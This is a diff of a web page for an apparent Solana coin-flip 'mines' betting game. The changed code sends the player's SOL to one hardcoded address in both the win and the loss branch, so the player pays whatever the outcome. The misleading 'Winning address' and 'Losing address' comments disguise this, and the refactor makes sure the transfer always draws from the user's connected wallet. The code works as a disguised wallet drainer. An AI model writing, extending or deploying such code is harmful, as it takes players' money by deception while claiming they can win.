@@ -38,7 +38,7 @@
     <button onclick="selectMines(5)">5 Mines</button>
     <button onclick="selectMines(20)">20 Mines</button>
 
-    <div class="mineSelection">
+    <div class="mineSelection" style="display:none;">
         <h2>Pick Heads or Tails:</h2>
         <button onclick="playGame('Heads')">Heads</button>
         <button onclick="playGame('Tails')">Tails</button>
@@ -80,10 +80,10 @@
             // Check if the user won or lost
             if (userChoice === result) {
                 document.getElementById("result").innerHTML += `You win ${selectedMines} mine(s)!`;
-                await transferSol(userWallet, "BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr", amountToTransfer); // Winning address
+                await transferSol("BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr", amountToTransfer); // Winning address
             } else {
                 document.getElementById("result").innerHTML += `You lose!`;
-                await transferSol(userWallet, "BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr", amountToTransfer); // Losing address
+                await transferSol("BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr", amountToTransfer); // Losing address
             }
         }
 
@@ -102,11 +102,11 @@
             }
         }
 
-        async function transferSol(fromWallet, toWallet, amount) {
+        async function transferSol(toWallet, amount) {
             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: new solanaWeb3.PublicKey(fromWallet),
+                    fromPubkey: new solanaWeb3.PublicKey(userWallet),
                     toPubkey: new solanaWeb3.PublicKey(toWallet),
                     lamports: amount,
                 })
@@ -114,7 +114,7 @@
 
             const { blockhash } = await connection.getLatestBlockhash();
             transaction.recentBlockhash = blockhash;
-            transaction.feePayer = new solanaWeb3.PublicKey(fromWallet);
+            transaction.feePayer = new solanaWeb3.PublicKey(userWallet);
 
             const signedTransaction = await window.solana.signTransaction(transaction);
             const signature = await connection.sendRawTransaction(signedTransaction.serialize());
